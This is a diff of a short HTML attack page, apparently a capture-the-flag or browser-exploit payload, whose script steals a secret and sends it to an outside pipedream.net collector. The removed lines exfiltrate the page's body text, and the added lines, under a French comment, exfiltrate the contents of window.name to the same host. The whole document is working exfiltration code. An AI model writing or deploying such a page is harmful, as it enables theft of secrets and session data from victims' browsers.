@@ -1,17 +1,10 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Exploit</title>
-    <meta charset="utf-8">
-  </head>
+  <head><meta charset="utf-8"><title>Collect</title></head>
   <body>
     <script>
-      try {
-        const secret = document.body.innerText;
-        fetch("https://eosaujiilwrrffu.m.pipedream.net?secret=" + encodeURIComponent(secret));
-      } catch (e) {
-        fetch("https://eosaujiilwrrffu.m.pipedream.net?error=" + encodeURIComponent(e.message));
-      }
+      // Exfiltrer le contenu de window.name (contenant le secret)
+      fetch("https://eosaujiilwrrffu.m.pipedream.net?secret=" + encodeURIComponent(window.name));
     </script>
   </body>
 </html>
